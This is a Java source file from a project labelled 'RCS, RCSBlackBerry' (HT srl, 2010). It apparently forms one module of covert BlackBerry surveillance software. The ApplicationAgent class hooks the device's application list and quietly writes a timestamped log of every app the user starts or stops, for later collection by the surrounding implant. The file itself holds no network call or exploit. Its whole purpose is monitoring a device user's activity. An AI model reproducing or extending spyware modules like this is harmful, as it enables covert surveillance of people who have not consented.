/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : ApplicationAgent.java
 * Created      : 28-apr-2010
 * *************************************************/

package blackberry.agent;

import java.util.Vector;

import blackberry.AppListener;
import blackberry.interfaces.ApplicationListObserver;
import blackberry.utils.Check;
import blackberry.utils.DateTime;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

// TODO: Auto-generated Javadoc
/**
 * log dei start e stop delle applicazioni.
 */
public final class ApplicationAgent extends Agent implements
        ApplicationListObserver {
    // #mdebug
    private static Debug debug = new Debug("ApplicationAgent",
            DebugLevel.VERBOSE);
    // #enddebug

    public int LOG_DELIMITER = 0xABADC0DE;

    boolean firstRun = true;

    /**
     * Instantiates a new application agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public ApplicationAgent(final boolean agentStatus) {
        super(Agent.AGENT_APPLICATION, agentStatus, true, "ApplicationAgent");
    }

    /**
     * Instantiates a new application agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected ApplicationAgent(final boolean agentStatus,
            final byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualRun() {
        // #debug debug
        debug.trace("run");

    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStart()
     */
    public void actualStart() {
        // #debug debug
        debug.trace("actualStart");
        firstRun = true;
        AppListener.getInstance().addApplicationListObserver(this);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStop()
     */
    public void actualStop() {
        // #debug debug
        debug.trace("actualStop");
        AppListener.getInstance().removeApplicationListObserver(this);
    }

    /*
     * (non-Javadoc)
     * @see
     * blackberry.interfaces.ApplicationListObserver#onApplicationListChange
     * (java.util.Vector, java.util.Vector)
     */
    public synchronized void onApplicationListChange(final Vector startedList,
            final Vector stoppedList) {

        // #ifdef DBC
        Check.requires(startedList != null, "startedList != null");
        Check.requires(stoppedList != null, "stoppedList != null");
        // #endif

        if (firstRun) {
            // #debug info
            debug.info("skipping first run");

            // #ifdef DBC
            Check.asserts(startedList.size() > 0, "startedList.size() > 0");
            Check.asserts(stoppedList.size() == 0, "stoppedList.size() == 0");
            // #endif

            firstRun = false;
            return;
        }

        log.createLog(null);

        int size = startedList.size();
        for (int i = 0; i < size; i++) {
            final String appName = (String) startedList.elementAt(i);

            //#debug debug
            debug.trace(appName + " START");
            writeLog(appName, "START");
        }

        size = stoppedList.size();
        for (int i = 0; i < size; i++) {
            final String appName = (String) stoppedList.elementAt(i);
            //#debug debug
            debug.trace(appName + " STOP");

            writeLog(appName, "STOP");
        }

        log.close();

        //#debug debug
        debug.trace("finished writing log");
    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        // #debug debug
        debug.trace("parse");
        return false;
    }

    private void writeLog(final String appName, final String condition) {
        final byte[] tm = (new DateTime()).getStructTm();

        final Vector items = new Vector();
        items.addElement(tm);
        items.addElement(WChar.getBytes(appName, true));
        items.addElement(WChar.getBytes(condition, true));
        items.addElement(WChar.getBytes("info", true));
        items.addElement(Utils.intToByteArray(LOG_DELIMITER));
        log.writeLogs(items);

    }
}
